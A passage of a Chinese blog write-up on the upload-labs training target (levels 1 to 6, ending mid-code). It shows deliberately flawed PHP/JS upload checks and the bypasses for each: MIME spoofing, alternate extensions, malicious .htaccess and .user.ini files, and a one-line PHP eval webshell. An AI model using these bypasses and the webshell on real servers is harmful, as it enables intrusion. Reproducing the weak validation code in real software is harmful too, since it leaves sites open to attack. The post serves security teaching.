<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />



  <link rel="icon" type="image/png" sizes="32x32" href="/favicon.ico?v=5.1.3">







  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="upload-labs 记录及文件上传总结">
<meta property="og:type" content="article">
<meta property="og:title" content="upload-labs-writeup">
<meta property="og:url" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/index.html">
<meta property="og:site_name" content="lyxhh">
<meta property="og:description" content="upload-labs 记录及文件上传总结">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/upload-lab1.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/upload-lab1-01.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/upload-lab1-02.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/upload-lab2.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/upload-lab3-01.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/upload-lab3.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/upload-lab4-01.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/upload-lab4-02.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/new-upload-lab5-00.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/new-upload-lab5-00-1.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/new-upload-lab5-01.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/new-upload-lab5-02.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/new-upload-lab5-03.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/new-upload-lab5-04.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/upload-lab5.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/upload-lab6.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/upload-lab7.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/upload-lab8.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/upload-lab8-01.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/upload-lab9.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/upload-lab10.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/upload-lab11.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/upload-lab12.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/upload-lab13-01.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/upload-lab13-02.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/upload-lab13-03.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/upload-lab16-01.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/upload-lab16-02.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/upload-lab17-01.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/upload-lab17-02.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/upload-lab17-03.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/upload-lab18-01.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/upload-lab19-01.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/upload-lab19.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/upload-lab20-01.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/upload-lab20-02.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/upload-lab20-03.png">
<meta property="og:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/file-upload-summary.png">
<meta property="og:updated_time" content="2020-01-11T13:36:23.976Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="upload-labs-writeup">
<meta name="twitter:description" content="upload-labs 记录及文件上传总结">
<meta name="twitter:image" content="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/upload-lab1.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.3',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/"/>





  <title>upload-labs-writeup | lyxhh</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">lyxhh</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="lyxhh">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/1.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lyxhh">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">upload-labs-writeup</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-05T10:29:25+08:00">
                2020-01-05
              </time>
            

            
              <span class="post-meta-divider">|</span>
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-check-o"></i>
              </span>
              
                <span class="post-meta-item-text">更新于&#58;</span>
              
              <time title="更新于" itemprop="dateModified" datetime="2020-01-11T21:36:23+08:00">
                2020-01-11
              </time>
            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>upload-labs 记录及文件上传总结<a id="more"></a></p>
<p>靶机地址：<a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="external">https://github.com/c0ny1/upload-labs</a></p>
<h2 id="Pass01"><a href="#Pass01" class="headerlink" title="Pass01"></a>Pass01</h2><p>JS前端校验:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">var</span> file = document.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</div><div class="line">    <span class="keyword">if</span> (file == <span class="keyword">null</span> || file == <span class="string">""</span>) &#123;</div><div class="line">        alert(<span class="string">"请选择要上传的文件!"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">//定义允许上传的文件类型</span></div><div class="line">    <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</div><div class="line">    <span class="comment">//提取上传文件的类型</span></div><div class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</div><div class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></div><div class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">"|"</span>) == <span class="number">-1</span>) &#123;</div><div class="line">        <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</div><div class="line">        alert(errMsg);</div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>直接上传php，弹框提示文件不合法，也没有数据包传输，猜测是本地js验证。<br><img src="/2020/01/05/upload-labs-writeup/upload-lab1.png" alt="upload-lab1"></p>
<p>关闭Google浏览器解析Javascript功能，<br>在 设置-&gt;高级-&gt;隐私设置和安全性-&gt;网站设置-&gt;JavaScript-&gt;关闭按钮</p>
<p><img src="/2020/01/05/upload-labs-writeup/upload-lab1-01.png" alt="upload-lab1-01"></p>
<p>关闭JavaScript解析后，F5刷新页面，直接上传php文件即可。<br><img src="/2020/01/05/upload-labs-writeup/upload-lab1-02.png" alt="upload-lab1-02"></p>
<h2 id="Pass02"><a href="#Pass02" class="headerlink" title="Pass02"></a>Pass02</h2><p>MIME校验：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</div><div class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">    $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]            </div><div class="line">    <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</div><div class="line">        $is_upload = <span class="keyword">true</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $msg = <span class="string">'上传出错！'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>MIME类型检测,直接上传PHP文件，修改<code>Content-Type: application/octet-stream</code>为<code>Content-Type: image/jpeg</code>.</p>
<p><img src="/2020/01/05/upload-labs-writeup/upload-lab2.png" alt="upload-lab2"></p>
<h2 id="Pass03"><a href="#Pass03" class="headerlink" title="Pass03"></a>Pass03</h2><p>黑名单校验不严：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</div><div class="line">$file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</div><div class="line">$file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></div><div class="line">$file_ext = strrchr($file_name, <span class="string">'.'</span>);</div><div class="line">$file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></div><div class="line">$file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></div><div class="line">$file_ext = trim($file_ext); <span class="comment">//收尾去空</span></div><div class="line"></div><div class="line"><span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</div><div class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">    $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </div><div class="line">    <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</div><div class="line">         $is_upload = <span class="keyword">true</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $msg = <span class="string">'上传出错！'</span>;</div><div class="line">    &#125;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>黑名单检测，检测了<code>.php</code>后缀，但未检测php3，phtml等后缀。</p>
<p>靶机默认支持的解析后缀为：<br><img src="/2020/01/05/upload-labs-writeup/upload-lab3-01.png" alt="upload-lab3-01"></p>
<p>因此直接上传php.phtml,得到Webshell。<br><img src="/2020/01/05/upload-labs-writeup/upload-lab3.png" alt="upload-lab3"></p>
<h2 id="Pass04"><a href="#Pass04" class="headerlink" title="Pass04"></a>Pass04</h2><p>黑名单校验不严：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".ini"</span>);</div><div class="line">$file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</div><div class="line">$file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></div><div class="line">$file_ext = strrchr($file_name, <span class="string">'.'</span>);</div><div class="line">$file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></div><div class="line">$file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></div><div class="line">$file_ext = trim($file_ext); <span class="comment">//收尾去空</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</div><div class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">    $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</div><div class="line">    <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</div><div class="line">        $is_upload = <span class="keyword">true</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $msg = <span class="string">'上传出错！'</span>;</div><div class="line">    &#125;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    $msg = <span class="string">'此文件不允许上传!'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>中间件为Apache的情况下，黑名单未校验htaccess文件，导致可上传htaccess文件，绕过黑名单检测。</p>
<p>以下配置 将后缀为lxhsec的文件，当成php解析。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;FilesMatch &quot;lxhsec&quot;&gt;</div><div class="line">SetHandler application/x-httpd-php</div><div class="line">&lt;/FilesMatch&gt;</div></pre></td></tr></table></figure></p>
<p>先上传.htaccess文件<br><img src="/2020/01/05/upload-labs-writeup/upload-lab4-01.png" alt="upload-lab4-01"></p>
<p>然后再上传php.lxhsec,得到Webshell.<br><img src="/2020/01/05/upload-labs-writeup/upload-lab4-02.png" alt="upload-lab4-02"></p>
<h2 id="Pass05"><a href="#Pass05" class="headerlink" title="Pass05"></a>Pass05</h2><p>黑名单校验不严：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</div><div class="line">$file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</div><div class="line">$file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></div><div class="line">$file_ext = strrchr($file_name, <span class="string">'.'</span>);</div><div class="line">$file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></div><div class="line">$file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></div><div class="line">$file_ext = trim($file_ext); <span class="comment">//首尾去空</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</div><div class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">    $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</div><div class="line">    <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</div><div class="line">        $is_upload = <span class="keyword">true</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $msg = <span class="string">'上传出错！'</span>;</div><div class="line">    &#125;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    $msg = <span class="string">'此文件类型不允许上传！'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>当PHP以<code>CGI／FastCGI</code>模式运行的情况下，黑名单未校验后缀为<code>.ini</code>的文件，导致可上传<code>.user.ini</code>文件，绕过黑名单检测。</p>
<p>详情可以看下乌云的一篇文章<a href="http://drops.wooyun.org/tips/3424" target="_blank" rel="external">.user.ini文件构成的PHP后门</a></p>
<p><a href="https://www.php.net/manual/zh/configuration.file.per-user.php" target="_blank" rel="external">.user.ini 文件官方说明</a></p>
<p>使用作者提供的phpstudy集成环境是无法利用<code>.user.ini</code>文件，因为不满足利用的三个条件：</p>
<ol>
<li>服务器脚本语言为PHP</li>
<li>服务器使用CGI／FastCGI模式</li>
<li>上传目录下要有可执行的php文件</li>
</ol>
<p>其中 第二条不满足,使用的模式不是<code>CGI／FastCGI</code>。<br>第三个条件，作者在upload目录下为我们提供了一个readme.php。<br><img src="/2020/01/05/upload-labs-writeup/new-upload-lab5-00.png" alt="new-upload-lab5-00"></p>
<p>这里我们直接使用phpstudy2014的集成环境中的<code>Nginx+PHP 5.4n</code>去复现这个漏洞。<br><img src="/2020/01/05/upload-labs-writeup/new-upload-lab5-00-1.png" alt="new-upload-lab5-00-1"></p>
<p>首先上传<code>.user.ini</code>文件，文件内容为：<br><code>auto_prepend_file=Pass05.png</code><br><img src="/2020/01/05/upload-labs-writeup/new-upload-lab5-01.png" alt="new-upload-lab5-01"></p>
<p>接着上传<code>Pass05.png</code>文件，文件内容为：<br><code>&lt;?php @eval($_POST[&#39;lxhsec&#39;]);?&gt;</code><br><img src="/2020/01/05/upload-labs-writeup/new-upload-lab5-02.png" alt="new-upload-lab5-02"></p>
<p>等待五分钟后，访问readme.php:<br><img src="/2020/01/05/upload-labs-writeup/new-upload-lab5-03.png" alt="new-upload-lab5-03"></p>
<p>如果等不了五分钟，<br>1.可以直接重启phpstudy，让上传的<code>.user.ini</code>立即生效。<br>2.或者 可以修改php.ini，将<code>user_ini.cache_ttl</code>修改为10秒,修改后保存php.ini文件并重启phpstudy，之后再进行上面的操作即可。<br><img src="/2020/01/05/upload-labs-writeup/new-upload-lab5-04.png" alt="new-upload-lab5-04"></p>
<p><strong>Note:</strong> 经过测试 发现必须更改php.ini内的<code>user_ini.cache_ttl</code>才有效，如果将上传的.user.ini文件内容加多一句<code>user_ini.cache_ttl = 10</code>，这个是不会生效的，也依旧需要等五分钟。</p>
<h2 id="Pass06"><a href="#Pass06" class="headerlink" title="Pass06"></a>Pass06</h2><p>黑名单校验不严，没有将获取到的后缀名 转换 为小写字母 后再进行判断。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>,<span class="string">".ini"</span>);</div><div class="line">$file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</div><div class="line">$file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></div><div class="line">$file_ext = strrchr($file_name, <span class="string">'.'</span>);</div><div class="line">$file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></div><div class="line">$file_ext = trim($file_ext); <span class="comment">//首尾去空</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</div><div class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">    $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</div><div class="line">    <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</div><div class="line">        $is_upload = <span class="keyword">true</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $msg = <span class="string">'上传出错！'</span>;</div><div class="line">    &#125;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    $msg = <span class="string">'此文件类型不允许上传！'</span>;</div><div 